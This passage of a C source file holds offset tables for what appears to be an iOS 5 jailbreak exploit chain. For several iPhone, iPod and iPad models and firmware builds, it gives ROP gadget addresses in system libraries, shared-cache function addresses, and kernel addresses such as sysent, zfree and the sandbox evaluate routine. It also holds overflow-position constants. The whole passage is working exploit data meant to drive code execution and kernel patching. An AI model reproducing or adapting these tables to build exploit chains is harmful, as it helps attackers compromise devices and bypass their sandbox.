    .GADGET_MOV_R1_R0__POP_R47 = (0x3443f9cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    .GADGET_MOV_R0_R1__POP_R47 = (0x30eba26e + 1),
    .GADGET_MOV_R0_R4__POP_R47 = (0x30ebdd5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    .GADGET_MOV_R1_R4__POP_R47 = (0x32a420ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    .GADGET_ADD_R0_R0_R1__POP457 = 0x30687ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x3247c100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802cbbac,
    .FLUSH_DCACHE_ALL = 0x80071b44,
    .INVALIDATE_ICACHE_ALL = 0x80071a64,
    .SB_EVALUATE = (0x809200ec + 1),
};

struct constants constants_bootstrap_iPod3_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPod3_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPod3_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x357c9dc4,
    ._dsc_fstat = 0x357ba6f4,
    ._dsc_chown = 0x357bc518,
    ._dsc_chmod = (0x357bbae0 + 1),
    ._dsc_memcpy = (0x357ba98c + 1),
    ._dsc_munmap = 0x357c9d68,
    ._dsc_unlink = (0x357bbeb4 + 1),
    ._dsc_mkdir = 0x357bcc34,
    ._dsc_ftruncate = 0x357bcca0,
    ._dsc_ioctl = (0x357bbbf8 + 1),
    ._dsc_close = 0x357ba71c,
    ._dsc_ptrace = 0x357ca394,
    ._dsc_bsdthread_terminate = 0x357c9228,
    ._dsc_shm_open = 0x357bc4a8,
    ._dsc_mmap = (0x357ba658 + 1),
    ._dsc_mach_task_self = (0x357c8d88 + 1),
    ._dsc_mach_port_allocate = (0x357bae44 + 1),
    ._dsc_mach_port_insert_right = (0x357bae70 + 1),
    ._dsc_mach_msg = (0x357ba1d4 + 1),
    ._dsc_mount = 0x357cb6e4,
    ._dsc_unmount = 0x357cc040,
    ._dsc_syscall = 0x357caafc,
    ._dsc_psynch_rw_unlock = 0x357ca1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x30825004 + 1),
    ._dsc_fread = (0x3082b814 + 1),
    ._dsc_fclose = (0x3082565c + 1),
    ._dsc_exit = (0x308279d0 + 1),
    ._dsc_syslog = (0x3081fad0 + 1),
    ._dsc_sysctl = (0x3081cc64 + 1),
    ._dsc_malloc = (0x3081c184 + 1),
    ._dsc_memmem = (0x30835cf0 + 1),
    ._dsc_sleep = (0x30833a54 + 1),
    ._dsc_proc_pidinfo = (0x308244e0 + 1),
    ._dsc_execl = (0x30847cac + 1),
    ._dsc_strcpy = 0x30821d30,
    ._dsc_sys_dcache_flush = 0x3082d80c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x3088c340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x3088cb10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x3083ff3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x3083ff38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x30845cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x3085949a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x3081f4b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x30844246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x30817c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x33269e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x3053701a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x30811fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x303d76ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x32e2739c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x35b63748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x35d359cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x3043b26e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x3043ed5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x30eb10ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x3148fae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x34b28100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x804660ec + 1)
};


struct constants constants_bootstrap_iPod4_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPod4_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPod4_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x35059dc4,
    ._dsc_fstat = 0x3504a6f4,
    ._dsc_chown = 0x3504c518,
    ._dsc_chmod = (0x3504bae0 + 1),
    ._dsc_memcpy = (0x3504a98c + 1),
    ._dsc_munmap = 0x35059d68,
    ._dsc_unlink = (0x3504beb4 + 1),
    ._dsc_mkdir = 0x3504cc34,
    ._dsc_ftruncate = 0x3504cca0,
    ._dsc_ioctl = (0x3504bbf8 + 1),
    ._dsc_close = 0x3504a71c,
    ._dsc_ptrace = 0x3505a394,
    ._dsc_bsdthread_terminate = 0x35059228,
    ._dsc_shm_open = 0x3504c4a8,
    ._dsc_mmap = (0x3504a658 + 1),
    ._dsc_mach_task_self = (0x35058d88 + 1),
    ._dsc_mach_port_allocate = (0x3504ae44 + 1),
    ._dsc_mach_port_insert_right = (0x3504ae70 + 1),
    ._dsc_mach_msg = (0x3504a1d4 + 1),
    ._dsc_mount = 0x3505b6e4,
    ._dsc_unmount = 0x3505c040,
    ._dsc_syscall = 0x3505aafc,
    ._dsc_psynch_rw_unlock = 0x3505a1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x36f2d004 + 1),
    ._dsc_fread = (0x36f33814 + 1),
    ._dsc_fclose = (0x36f2d65c + 1),
    ._dsc_exit = (0x36f2f9d0 + 1),
    ._dsc_syslog = (0x36f27ad0 + 1),
    ._dsc_sysctl = (0x36f24c64 + 1),
    ._dsc_malloc = (0x36f24184 + 1),
    ._dsc_memmem = (0x36f3dcf0 + 1),
    ._dsc_sleep = (0x36f3ba54 + 1),
    ._dsc_proc_pidinfo = (0x36f2c4e0 + 1),
    ._dsc_execl = (0x36f4fcac + 1),
    ._dsc_strcpy = 0x36f29d30,
    ._dsc_sys_dcache_flush = 0x36f3580c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x36f94340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x36f94b10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x36f47f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x36f47f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x36f4dcd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x36f6149a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x36f274b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x36f4c246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x36f1fc82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x32d72e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x314df01a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x348e4fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x37be96ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x33e1839c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x318c9748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x347339cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x37ba026e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x37ba3d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x331d50ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x37c02ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x33e26100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x805fb0ec + 1)
};


struct constants constants_bootstrap_iPhone4_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone4_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone4_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x332cfdc4,
    ._dsc_fstat = 0x332c06f4,
    ._dsc_chown = 0x332c2518,
    ._dsc_chmod = (0x332c1ae0 + 1),
    ._dsc_memcpy = (0x332c098c + 1),
    ._dsc_munmap = 0x332cfd68,
    ._dsc_unlink = (0x332c1eb4 + 1),
    ._dsc_mkdir = 0x332c2c34,
    ._dsc_ftruncate = 0x332c2ca0,
    ._dsc_ioctl = (0x332c1bf8 + 1),
    ._dsc_close = 0x332c071c,
    ._dsc_ptrace = 0x332d0394,
    ._dsc_bsdthread_terminate = 0x332cf228,
    ._dsc_shm_open = 0x332c24a8,
    ._dsc_mmap = (0x332c0658 + 1),
    ._dsc_mach_task_self = (0x332ced88 + 1),
    ._dsc_mach_port_allocate = (0x332c0e44 + 1),
    ._dsc_mach_port_insert_right = (0x332c0e70 + 1),
    ._dsc_mach_msg = (0x332c01d4 + 1),
    ._dsc_mount = 0x332d16e4,
    ._dsc_unmount = 0x332d2040,
    ._dsc_syscall = 0x332d0afc,
    ._dsc_psynch_rw_unlock = 0x332d01a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x35e5f004 + 1),
    ._dsc_fread = (0x35e65814 + 1),
    ._dsc_fclose = (0x35e5f65c + 1),
    ._dsc_exit = (0x35e619d0 + 1),
    ._dsc_syslog = (0x35e59ad0 + 1),
    ._dsc_sysctl = (0x35e56c64 + 1),
    ._dsc_malloc = (0x35e56184 + 1),
    ._dsc_memmem = (0x35e6fcf0 + 1),
    ._dsc_sleep = (0x35e6da54 + 1),
    ._dsc_proc_pidinfo = (0x35e5e4e0 + 1),
    ._dsc_execl = (0x35e81cac + 1),
    ._dsc_strcpy = 0x35e5bd30,
    ._dsc_sys_dcache_flush = 0x35e6780c,

    .LIBC_POP_R0 = 0x35ec6340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x35ec6b10,
    .LIBC_POP_R47 = (0x35e79f3e + 1),
    .LIBC_BLX_R4_POP_R47 = (0x35e79f38 + 1),
    .LIBC_MOV_SP_R4__POP_R47 = (0x35e7fcd8 + 1),
    .LIBC_STR_R0_R4__POP_R47 = (0x35e9349a + 1),
    .LIBC_LDR_R0_R0__POP_R7 = (0x35e594b4 + 1),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x35e7e246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x35e51c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x3660ae2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x363ab01a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x31d27fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x358116ec + 1),

    // libxpc.dylib
    .LIBC_BLX_R4_POP_R457 = (0x3695c39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x341af748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    .GADGET_MOV_R1_R0__POP_R47 = (0x35f959cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    .GADGET_MOV_R0_R1__POP_R47 = (0x3088d26e + 1),
    .GADGET_MOV_R0_R4__POP_R47 = (0x30890d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    .GADGET_MOV_R1_R4__POP_R47 = (0x32f4d0e4 + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    .GADGET_ADD_R0_R0_R1__POP457 = 0x32edfae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x3696f100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802CBBAC,
    .FLUSH_DCACHE_ALL = 0x80071B44,
    .INVALIDATE_ICACHE_ALL = 0x80071A64,
    .SB_EVALUATE = (0x805690EC + 1)
};

struct constants constants_bootstrap_iPhone4_1_9A406 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone4_1_9A406 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone4_1_9A406 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x30402dc4,
    ._dsc_fstat = 0x303f36f4,
    ._dsc_chown = 0x303f5518,
    ._dsc_chmod = (0x303f4ae0 + 1),
    ._dsc_memcpy = (0x303f398c + 1),
    ._dsc_munmap = 0x30402d68,
    ._dsc_unlink = (0x303f4eb4 + 1),
    ._dsc_mkdir = 0x303f5c34,
    ._dsc_ftruncate = 0x303f5ca0,
    ._dsc_ioctl = (0x303f4bf8 + 1),
    ._dsc_close = 0x303f371c,
    ._dsc_ptrace = 0x30403394,
    ._dsc_bsdthread_terminate = 0x30402228,
    ._dsc_shm_open = 0x303f54a8,
    ._dsc_mmap = (0x303f3658 + 1),
    ._dsc_mach_task_self = (0x30401d88 + 1),
    ._dsc_mach_port_allocate = (0x303f3e44 + 1),
    ._dsc_mach_port_insert_right = (0x303f3e70 + 1),
    ._dsc_mach_msg = (0x303f31d4 + 1),
    ._dsc_mount = 0x304046e4,
    ._dsc_unmount = 0x30405040,
    ._dsc_syscall = 0x30403afc,
    ._dsc_psynch_rw_unlock = 0x304031a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x319e0004 + 1),
    ._dsc_fread = (0x319e6814 + 1),
    ._dsc_fclose = (0x319e065c + 1),
    ._dsc_exit = (0x319e29d0 + 1),
    ._dsc_syslog = (0x319daad0 + 1),
    ._dsc_sysctl = (0x319d7c64 + 1),
    ._dsc_malloc = (0x319d7184 + 1),
    ._dsc_memmem = (0x319f0cf0 + 1),
    ._dsc_sleep = (0x319eea54 + 1),
    ._dsc_proc_pidinfo = (0x319df4e0 + 1),
    ._dsc_execl = (0x31a02cac + 1),
    ._dsc_strcpy = 0x319dcd30,
    ._dsc_sys_dcache_flush = 0x319e880c,

    .LIBC_POP_R0 = 0x31a47340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x31a47b10,
    .LIBC_POP_R47 = (0x303fb3fe + 1),
    .LIBC_BLX_R4_POP_R47 = (0x363ae0c8 + 1),
    .LIBC_MOV_SP_R4__POP_R47 = (0x319e55aa + 1),
    .LIBC_STR_R0_R4__POP_R47 = (0x319f5b7c + 1),
    .LIBC_LDR_R0_R0__POP_R7 = (0x319da4b4 + 1),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x319ff246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x319d2c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x363b2e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x34da101a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x36c35fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x376f36ec + 1),

    // libxpc.dylib
    .LIBC_BLX_R4_POP_R457 = (0x320b739c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x344c2748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    .GADGET_MOV_R1_R0__POP_R47 = (0x36e659cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    .GADGET_MOV_R0_R1__POP_R47 = (0x35a1326e + 1),
    .GADGET_MOV_R0_R4__POP_R47 = (0x35a16d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    .GADGET_MOV_R1_R4__POP_R47 = (0x31d590e4 + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    .GADGET_ADD_R0_R0_R1__POP457 = 0x3040bae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x3660e100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802cbbac,
    .FLUSH_DCACHE_ALL = 0x80071b44,
    .INVALIDATE_ICACHE_ALL = 0x80071a64,
    .SB_EVALUATE = (0x805690ec + 1),
};

struct constants constants_bootstrap_iPhone4_1_9A334 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone4_1_9A334 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone4_1_9A334 =
{
    ._dsc_open = (0x00010dc4 +0+0x3099b000),
    ._dsc_fstat = (0x000016f4 +0+0x3099b000),
    ._dsc_chown = (0x00003518 +0+0x3099b000),
    ._dsc_chmod = (0x00002ae0 +1+0x3099b000),
    ._dsc_memcpy = (0x0000198c +1+0x3099b000),
    ._dsc_munmap = (0x00010d68 +0+0x3099b000),
    ._dsc_unlink = (0x00002eb4 +1+0x3099b000),
    ._dsc_mkdir = (0x00003c34 +0+0x3099b000),
    ._dsc_ftruncate = (0x00003ca0 +0+0x3099b000),
    ._dsc_ioctl = (0x00002bf8 +1+0x3099b000),
    ._dsc_close = (0x0000171c +0+0x3099b000),
    ._dsc_ptrace = (0x00011394 +0+0x3099b000),
    ._dsc_bsdthread_terminate = (0x00010228 +0+0x3099b000),
    ._dsc_shm_open = (0x000034a8 +0+0x3099b000),
    ._dsc_mmap = (0x00001658 +1+0x3099b000),
    ._dsc_mach_task_self = (0x0000fd88 +1+0x3099b000),
    ._dsc_mach_port_allocate = (0x00001e44 +1+0x3099b000),
    ._dsc_mach_port_insert_right = (0x00001e70 +1+0x3099b000),
    ._dsc_mach_msg = (0x000011d4 +1+0x3099b000),
    ._dsc_mount = (0x000126e4 +0+0x3099b000),
    ._dsc_unmount = (0x00013040 +0+0x3099b000),
    ._dsc_syscall = (0x00011afc +0+0x3099b000),
    ._dsc_psynch_rw_unlock = (0x000111a0 +0+0x3099b000),

    ._dsc_fopen = (0x00010004 +1+0x37a65000),
    ._dsc_fread = (0x00016814 +1+0x37a65000),
    ._dsc_fclose = (0x0001065c +1+0x37a65000),
    ._dsc_exit = (0x000129d0 +1+0x37a65000),
    ._dsc_syslog = (0x0000aad0 +1+0x37a65000),
    ._dsc_sysctl = (0x00007c64 +1+0x37a65000),
    ._dsc_malloc = (0x00007184 +1+0x37a65000),
    ._dsc_memmem = (0x00020cf0 +1+0x37a65000),
    ._dsc_sleep = (0x0001ea54 +1+0x37a65000),
    ._dsc_proc_pidinfo = (0x0000f4e0 +1+0x37a65000),
    ._dsc_execl = (0x00032cac +1+0x37a65000),
    ._dsc_strcpy = (0x0000cd30 +0+0x37a65000),
    ._dsc_sys_dcache_flush = (0x0001880c +0+0x37a65000),

    .LIBC_POP_R0 = (0x00077340 +0+0x37a65000),
    .LIBC_POP_R0123 = (0x00077b10 +0+0x37a65000),
    .LIBC_POP_R47 = (0x0002af3e +1+0x37a65000),
    .LIBC_BLX_R4_POP_R47 = (0x0002af38 +1+0x37a65000),
    .LIBC_MOV_SP_R4__POP_R47 = (0x00030cd8 +1+0x37a65000),
    .LIBC_STR_R0_R4__POP_R47 = (0x0004449a +1+0x37a65000),
    .LIBC_LDR_R0_R0__POP_R7 = (0x0000a4b4 +1+0x37a65000),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x0002f246 +1+0x37a65000),

    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x00002c82 +1+0x37a65000),
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x00057e2e +1+0x34897000),
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x0002001a +1+0x32847000),

    ._dsc_bootstrap_look_up = (0x00003fe8 +1+0x3696d000),
    ._dsc_dlsym = (0x000016ec +1+0x32796000),

    .LIBC_BLX_R4_POP_R457 = (0x0000c39c +1+0x34cfa000),

    .GADGET_SUBS_R0_R0_R1__POP7 = (0x00110748 +1+0x36b99000),
    .GADGET_MOV_R1_R0__POP_R47 = (0x000899cc +1+0x35f78000),
    .GADGET_MOV_R0_R1__POP_R47 = (0x00001a42 +1+0x3714d000),
    .GADGET_MOV_R0_R4__POP_R47 = (0x00002746 +1+0x3714d000),
    .GADGET_MOV_R1_R4__POP_R47 = (0x000580e4 +1+0x34ed3000),
    .GADGET_ADD_R0_R0_R1__POP457 = (0x00002ae8 +0+0x34db9000),

    .GADGET_HOLY = (0x00008100 +0+0x36e55000),

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802cbbac,
    .FLUSH_DCACHE_ALL = 0x80071b44,
    .INVALIDATE_ICACHE_ALL = 0x80071a64,
    .SB_EVALUATE = (0x805690ec + 1)
};

struct constants* global_constants[MAX_FIRMWARE][MAX_DEVICE] =
{
    [FW9A334] = {
        [iPad1_1] = &constants_iPad1_1_9A334,
        [iPhone2_1] = &constants_iPhone2_1_9A334,
        [iPhone3_1] = &constants_iPhone3_1_9A334,
        [iPhone4_1] = &constants_iPhone4_1_9A334,
    },

    [FW9A405] = {
        [iPad1_1] = &constants_iPad1_1,
	[iPhone2_1] = &constants_iPhone2_1,
        [iPhone3_1] = &constants_iPhone3_1,
        [iPhone3_3] = &constants_iPhone3_3,
        [iPhone4_1] = &constants_iPhone4_1,
        [iPad2_1] = &constants_iPad2_1,
        [iPad2_2] = &constants_iPad2_2,
        [iPad2_3] = &constants_iPad2_3,
	[iPod3_1] = &constants_iPod3_1,
	[iPod4_1] = &constants_iPod4_1,
    },

    [FW9A406] = {
        [iPhone4_1] = &constants_iPhone4_1_9A406,
    },
};

struct constants* global_constants_bootstrap[MAX_FIRMWARE][MAX_DEVICE] =
{
    [FW9A334] = {
        [iPad1_1] = &constants_bootstrap_iPad1_1_9A334,
        [iPhone2_1] = &constants_bootstrap_iPhone2_1_9A334,
        [iPhone3_1] = &constants_bootstrap_iPhone3_1_9A334,
        [iPhone4_1] = &constants_bootstrap_iPhone4_1_9A334,
    },

    [FW9A405] = {
        [iPad1_1] = &constants_bootstrap_iPad1_1,
	[iPhone2_1] = &constants_bootstrap_iPhone2_1,
        [iPhone3_1] = &constants_bootstrap_iPhone3_1,
        [iPhone3_3] = &constants_bootstrap_iPhone3_3,
        [iPhone4_1] = &constants_bootstrap_iPhone4_1,
        [iPad2_1] = &constants_bootstrap_iPad2_1,
        [iPad2_2] = &constants_bootstrap_iPad2_2,
        [iPad2_3] = &constants_bootstrap_iPad2_3,
	[iPod3_1] = &constants_bootstrap_iPod3_1,
	[iPod4_1] = &constants_bootstrap_iPod4_1,
    },

    [FW9A406] = {
        [iPhone4_1] = &constants_bootstrap_iPhone4_1_9A406,
    },
};

struct offsets* global_offsets[MAX_FIRMWARE][MAX_DEVICE] =
{
    [FW9A334] = {
